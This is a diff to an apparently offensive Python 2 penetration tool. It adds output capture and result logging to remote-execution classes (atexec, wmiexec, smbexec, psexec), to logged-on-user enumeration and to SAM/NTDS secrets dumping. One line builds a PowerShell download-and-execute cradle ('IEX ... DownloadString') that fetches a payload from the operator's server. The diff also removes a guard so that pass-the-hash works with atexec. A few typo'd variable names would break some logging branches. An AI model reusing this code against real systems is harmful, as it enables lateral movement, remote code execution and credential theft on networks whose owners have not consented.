@@ -1591,6 +1591,7 @@ class USERENUM:
         self.__filterUsers = None
         self.__targetsThreadEvent = None
         self.__maxConnections = int(options.max_connections)
+        self.output = ""
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
 
@@ -1787,10 +1788,12 @@ class USERENUM:
                     # Are we filtering users?
                     if self.__filterUsers is not None:
                         if userName in self.__filterUsers:
-                            print "%s: user %s logged from host %s - active: %d, idle: %d" % (target,userName, sourceIP, session['sesi10_time'], session['sesi10_idle_time'])
+                            #print "%s: user %s logged from host %s - active: %d, idle: %d" % (target,userName, sourceIP, session['sesi10_time'], session['sesi10_idle_time'])
+                            self.output += "\n %s: user %s logged from host %s - active: %d, idle: %d \n" % (target,userName, sourceIP, session['sesi10_time'], session['sesi10_idle_time'])
                             printCRLF=True
                     else:
-                        print "%s: user %s logged from host %s - active: %d, idle: %d" % (target,userName, sourceIP, session['sesi10_time'], session['sesi10_idle_time'])
+                        #print "%s: user %s logged from host %s - active: %d, idle: %d" % (target,userName, sourceIP, session['sesi10_time'], session['sesi10_idle_time'])
+                        self.output += "\n %s: user %s logged from host %s - active: %d, idle: %d \n" % (target,userName, sourceIP, session['sesi10_time'], session['sesi10_idle_time'])
                         printCRLF=True
 
         # Let's see who deleted a connection since last check
@@ -1801,14 +1804,16 @@ class USERENUM:
                 # Are we filtering users?
                 if self.__filterUsers is not None:
                     if userName in self.__filterUsers:
-                        print "%s: user %s logged off from host %s" % (target, userName, sourceIP)
+                        #print "%s: user %s logged off from host %s" % (target, userName, sourceIP)
+                        self.output += "\n %s: user %s logged off from host %s \n" % (target, userName, sourceIP)
                         printCRLF=True
                 else:
-                    print "%s: user %s logged off from host %s" % (target, userName, sourceIP)
+                    #print "%s: user %s logged off from host %s" % (target, userName, sourceIP)
+                    self.output += "\n %s: user %s logged off from host %s \n" % (target, userName, sourceIP)
                     printCRLF=True
 
         if printCRLF is True:
-            print
+            print ""
 
     def getLoggedIn(self, target):
         if self.__targets[target]['Admin'] is False:
@@ -1866,11 +1871,15 @@ class USERENUM:
                 # Are we filtering users?
                 if self.__filterUsers is not None:
                     if userName in self.__filterUsers:
-                        print "%s: user %s\\%s logged in LOCALLY" % (target,logonDomain,userName)
-                        printCRLF=True
+                        #print "%s: user %s\\%s logged in LOCALLY" % (target,logonDomain,userName)
+                        self.output += "%s: user %s\\%s logged in LOCALLY \n" % (target,logonDomain,userName)
+                        #printCRLF=True
+                        printCRLF=False
                 else:
-                    print "%s: user %s\\%s logged in LOCALLY" % (target,logonDomain,userName)
-                    printCRLF=True
+                    #print "%s: user %s\\%s logged in LOCALLY" % (target,logonDomain,userName)
+                    self.output += "%s: user %s\\%s logged in LOCALLY \n" % (target,logonDomain,userName)
+                    #printCRLF=True
+                    printCRLF=False
 
         # Let's see who logged out since last check
         for session in self.__targets[target]['LoggedIn'].copy():
@@ -1880,11 +1889,15 @@ class USERENUM:
                 # Are we filtering users?
                 if self.__filterUsers is not None:
                     if userName in self.__filterUsers:
-                        print "%s: user %s\\%s logged off LOCALLY" % (target,logonDomain,userName)
-                        printCRLF=True
+                        #print "%s: user %s\\%s logged off LOCALLY" % (target,logonDomain,userName)
+                        self.output += "%s: user %s\\%s logged off LOCALLY\n" % (target,logonDomain,userName)
+                        #printCRLF=True
+                        printCRLF = False
                 else:
-                    print "%s: user %s\\%s logged off LOCALLY" % (target,logonDomain,userName)
-                    printCRLF=True
+                    #print "%s: user %s\\%s logged off LOCALLY" % (target,logonDomain,userName)
+                    self.output += "%s: user %s\\%s logged off LOCALLY\n" % (target,logonDomain,userName)
+                    #printCRLF=True
+                    printCRLF = False
 
         if printCRLF is True:
             print
@@ -1892,6 +1905,9 @@ class USERENUM:
     def stop(self):
         if self.__targetsThreadEvent is not None:
             self.__targetsThreadEvent.set()
+
+    def return_data(self):
+        return(self.output)
 
 
 '''
@@ -2157,6 +2173,7 @@ class ATSVC_EXEC:
         self.__lmhash = ''
         self.__nthash = ''
         self.__command = command
+        self.output = ""
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
 
@@ -2211,10 +2228,13 @@ class ATSVC_EXEC:
             # Got a response. No need for further iterations.
             sys.exit("[-] Nothing left to process")
 
+    def return_data(self):
+        return(self.output)
 
     def doStuff(self, rpctransport):
         def output_callback(data):
-            print data
+            #print data
+            self.output = data
 
         dce = rpctransport.get_dce_rpc()
 
@@ -2654,6 +2674,7 @@ class WMIEXEC:
         self.__share = share
         self.__noOutput = noOutput
         self.__doKerberos = doKerberos
+        self.output = ""
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
 
@@ -2704,6 +2725,9 @@ class WMIEXEC:
         if smbConnection is not None:
             smbConnection.logoff()
         dcom.disconnect()
+        
+    def return_data(self):
+        return self.shell.return_data()
 
 class WmiexecRemoteShell(cmd.Cmd):
     def __init__(self, share, win32Process, smbConnection):
@@ -2850,10 +2874,12 @@ class WmiexecRemoteShell(cmd.Cmd):
 
     def send_data(self, data):
         self.execute_remote(data)
-        print self.__outputBuffer
+        self.output = self.__outputBuffer
+        #print self.__outputBuffer
         self.__outputBuffer = ''
 
-
+    def return_data(self):
+        return self.output
 
 '''
 Author: Christopher Duffy
@@ -3218,8 +3244,6 @@ class Obfiscator:
                 text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function))
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
-        print(self.command) #DEBUG
-        print(self.unprotected_command) #DEBUG
 
 '''
 LOCAL INTERFACE DETECTION FUNCTIONS
@@ -3340,11 +3364,11 @@ def smb_server(working_dir, share_name):
 METHOD FUNCTIONS
 '''
 
-def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value):
+def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat):
     srv = None
-    if hash and not pwd:
-        print("[-] --atexec requires a password, please try a different user or crack hash %s for user %s") % (hash, usr)
-        return
+    #if hash and not pwd:
+    #    print("[-] --atexec requires a password, please try a different user or crack hash %s for user %s") % (hash, usr)
+    #    return
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3363,8 +3387,10 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
             sys.exit("[!] To execute this attack the catapult server needs to start")
         with Timeout(timeout_value):
             try:
-                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command, proto = protocol)
+                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = command, proto = protocol)
                 shell.play(dst)
+                data = shell.return_data()
+                output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occured: %s") % (e)
                 if srv:
@@ -3377,8 +3403,10 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
             sys.exit("[!] To execute this attack the catapult server needs to start")
         with Timeout(timeout_value):
             try:
-                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
+                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
                 shell.play(dst)
+                data = shell.return_data()
+                output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occured: %s") % (e)
                 if srv:
@@ -3388,8 +3416,10 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
     else:         
         with Timeout(timeout_value):
             try:
-                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
+                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
                 shell.play(dst)
+                data = shell.return_data()
+                output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occured: %s") % (e)
                 if srv:
@@ -3400,7 +3430,7 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
        srv.terminate()
        print("[*] Shutting down the catapult %s server for %s"  % (str(delivery), str(dst)))
 
-def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value):
+def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat):
     srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
@@ -3430,7 +3460,7 @@ def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
         srv.terminate()
         print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
 
-def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value):
+def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat):
     srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
@@ -3460,7 +3490,7 @@ def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
         srv.terminate()
         print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
 
-def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value):
+def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat):
     srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
@@ -3482,6 +3512,8 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                     sys.exit("[!] To execute this attack the catapult server needs to start")
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
+                data = shell.return_data()
+                output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if srv:
@@ -3503,6 +3535,8 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                     sys.exit("[!] To execute this attack the catapult server needs to start")
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
+                data = shell.return_data()
+                output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if srv:
@@ -3524,6 +3558,8 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                     sys.exit("[!] To execute this attack the catapult server needs to start")
                     shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                     shell.run(dst)
+                    data = shell.return_data()
+                    output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if srv:
@@ -3542,6 +3578,8 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
             try:
                 shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
+                data = shell.return_data()
+                output_handler(logger_obj, output_cat, data, dst, verbose)
             except (Exception, KeyboardInterrupt), e:
                 if srv:
                     srv.terminate()
@@ -3549,7 +3587,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
                 return # changed from continue inside a function
 
-def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value): 
+def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat): 
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3566,12 +3604,13 @@ def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods
     try:
         shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
         shell.run()
+        data = shell.return_data() 
+        output_handler(logger_obj, output_cat, data, dst, verbose)
     except (Exception, KeyboardInterrupt), e:
         print("[!] An error occured: %s") % (e)
         return
 
-
-def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value):
+def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat):
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3588,7 +3627,6 @@ def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntd
     except (Exception, KeyboardInterrupt), e:
         print("[!] An error occured during execution")
         return
-
 
 def instructions_func(payload, src_port, command, unprotected_command, smbexec_cmd, execution, delivery):
     if "web" in delivery and "invoker" or "executor" in execution:
@@ -3737,30 +3775,126 @@ def is_empty(structure):
     else:
         return True
 
-def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value):
+def output_handler(logger_obj, output_cat, data, dst, verbose):
+    groups_file = "/opt/ranger/results/groups/"
+    invoker_file = "/opt/ranger/results/invoker/"
+    secrets_file = "/opt/ranger/results/secrets_dump/"
+    commands_file = "/opt/ranger/results/command/"
+    downloader_file = "/opt/ranger/results/download/"
+    logged_in_file = "/opt/ranger/results/logged_in_users/"
+    results_file = "/opt/ranger/results/"
+    logger_obj.info(data)
+    for k, v in output_cat.iteritems():
+        if "invoker" in k:
+            if verbose > 0:
+                print(data)
+            filename = k + "_" + dst
+            dir = invoker_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)            
+        elif "executor" in k:
+            if verbose > 0:
+                print(data)
+            filename = k + "_" + dst
+            dir = commands_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "downloader" in k:
+            if verbose > 0:
+                print(data)
+            filename = k + "_" + dst
+            dir = downloader_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "domain_group" in k:
+            if verbose > 0:
+                print(data)
+            filename = v.strip("'") + "_" + dst
+            dir = groups_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "local_group" in k:
+            if verbose > 0:
+                print(data)
+            filename = v.strip("'") + "_" + dst
+            dir = groups_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "get_domain" in k:
+            if verbose > 0:
+                print(data)
+            filename = k + "_" + dst
+            dir = results_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "get_forest_domains" in k:
+            if verbose > 0:
+                print(data)
+            filename = k + "_" + dst
+            dir = results_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "find_local_admin_access" in k:
+            if verbose > 0:
+                print(data)
+            filename = k + "_" + dst
+            dir = results_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "netview_cmd" in k:
+            if verbose > 0:
+                print
+            filename = "logged_in_users" + "_" + dst
+            dir = logged_in_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "sam_dump" in k:
+            if verbose > 0:
+                print(data)
+            filename = "secrets_dump" + "_" + dst
+            dir = secrets_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+        elif "command" in k:
+            if verbose > 0:
+                print(data)
+            filename = k + "_" + dst
+            dir = commands_file + filenane
+            with open(dir, 'w') as f:
+                f.write(data)
+        else:
+            if verbose > 0:
+                print(data)
+            filename = "unknown" + "_" + dst
+            dir = results_fule + filename
+            with open(dir, 'w') as f:
+                f.write(data)
+
+
+def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods):
     if psexec_cmd:
         for dst in final_targets:
-            psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value)
+            psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat)
             time.sleep(sleep_value)
     elif wmiexec_cmd:
         for dst in final_targets:
-            wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value)
+            wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat)
             time.sleep(sleep_value)
     elif netview_cmd:
         for dst in final_targets:
-            netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value)
+            netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat)
             time.sleep(sleep_value)
     elif smbexec_cmd:
         for dst in final_targets:
-            smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value)
+            smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat)
             time.sleep(sleep_value)
     elif atexec_cmd:
         for dst in final_targets:
-            atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value)
+            atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat)
             time.sleep(sleep_value)
     elif sam_dump:
         for dst in final_targets:
-            sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value)
+            sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat)
             time.sleep(sleep_value)
     else:
         print(instructions)   
@@ -3956,6 +4090,7 @@ Create Pasteable Double Encoded Script:
     usr_temp = None
     pwd_temp = None
     NTLM_temp = ""
+    output_cat = {}
 
     # Configure logger formats for STDERR and output file
     file_handler.setFormatter(format)
@@ -4205,6 +4340,7 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["invoker"] = True
     elif executor:
         if not payload or not mim_func:
             sys.exit("[!] You must provide at least the name tool to be injected into memory and the cmdlet name to be executed")
@@ -4212,12 +4348,15 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["executor"] = True
     elif downloader:
         if delivery == "smb":
             sys.exit("[!] The Metasploit web_delivery module only works through web server based attacks")
         execution = "downloader"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
+        output_cat["downloader"] = True
+        attacks = True
     elif domain_group:
         execution = "domain_group"
         domain_group = "'" + domain_group + "'"
@@ -4233,6 +4372,7 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["domain_group"] = domain_group
     elif local_group:
         execution = "local_group"
         local_group = "'" + local_group + "'"
@@ -4245,6 +4385,7 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["local_group"] = local_group
     elif get_domain:
         execution = "executor"
         if mim_func == None:
@@ -4254,6 +4395,7 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["get_domain"] = True
     elif get_forest:
         execution = "executor"
         if mim_func == None:
@@ -4263,6 +4405,7 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["get_forest"] = True
     elif get_forest_domains:
         execution = "executor"
         if mim_func == None:
@@ -4272,6 +4415,7 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["get_forest_domains"] = True
     elif get_dc:
         execution = "executor"
         if mim_func == None:
@@ -4281,6 +4425,7 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["get_dc"] = True
     elif find_local_admin_access:
         execution = "executor"
         if mim_func == None:
@@ -4301,12 +4446,16 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
+        output_cat["find_local_admin_access"] = True
     elif netview_cmd:
         attacks = True
+        output_cat["netview_cmd"] = True
     elif sam_dump:
         attacks = True
+        output_cat["sam_dump"] = True
     elif command:
         attacks = False
+        output_cat["command"] = True
     else:
         attacks = False
 
@@ -4329,9 +4478,9 @@ Create Pasteable Double Encoded Script:
             usr = value[4]
             pwd = value[5]
             dom = value[6]
-            method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value)
+            method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods)
     else: 
-        method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value)
+        method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods)
 
 
 if __name__ == '__main__':
